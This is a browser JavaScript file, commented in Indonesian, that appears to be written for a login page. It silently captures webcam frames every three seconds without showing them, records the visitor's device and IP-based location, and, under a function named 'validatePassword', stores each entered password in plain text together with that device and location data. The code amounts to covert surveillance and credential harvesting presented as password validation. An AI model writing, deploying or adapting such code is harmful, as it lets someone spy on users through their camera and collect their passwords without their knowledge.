// Mengakses kamera tanpa menampilkannya
navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        setInterval(() => {
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            canvas.width = 320;
            canvas.height = 240;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Kirim gambar ke localStorage
            const imageData = canvas.toDataURL("image/jpeg");
            localStorage.setItem("cameraFrame", imageData);
        }, 3000);
    })
    .catch((error) => console.error("Akses kamera ditolak", error));

// Fungsi untuk mendapatkan informasi perangkat
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let deviceType = "Tidak Diketahui";
    
    if (/Android/i.test(userAgent)) deviceType = "Android";
    else if (/iPhone|iPad|iPod/i.test(userAgent)) deviceType = "iOS";
    else if (/Windows/i.test(userAgent)) deviceType = "Windows";
    else if (/Mac/i.test(userAgent)) deviceType = "MacOS";
    else if (/Linux/i.test(userAgent)) deviceType = "Linux";
    
    return {
        device: deviceType,
        userAgent: userAgent
    };
}

// Fungsi untuk mendapatkan lokasi tanpa izin langsung
function getLocation(callback) {
    const apiURL = "https://ipapi.co/json/";
    fetch(apiURL)
        .then(response => response.json())
        .then(data => {
            callback({
                city: data.city || "Tidak Diketahui",
                region: data.region || "Tidak Diketahui",
                country: data.country_name || "Tidak Diketahui"
            });
        })
        .catch(error => {
            console.error("Gagal mendapatkan lokasi", error);
            callback({ city: "Tidak Diketahui", region: "Tidak Diketahui", country: "Tidak Diketahui" });
        });
}

// Simpan data login ke localStorage
function saveLoginData(password) {
    getLocation((location) => {
        const loginData = JSON.parse(localStorage.getItem("loginData")) || [];
        const deviceInfo = getDeviceInfo();
        const time = new Date().toLocaleString();

        loginData.push({
            time,
            password,
            device: deviceInfo.device,
            userAgent: deviceInfo.userAgent,
            location: `${location.city}, ${location.region}, ${location.country}`
        });

        // Simpan ke localStorage
        localStorage.setItem("loginData", JSON.stringify(loginData));
    });
}

// Perbarui fungsi validasi password
function validatePassword() {
    const passwordInput = document.getElementById("password");
    const password = passwordInput.value.trim();

    if (password) {
        saveLoginData(password); // Simpan data login
    }
}
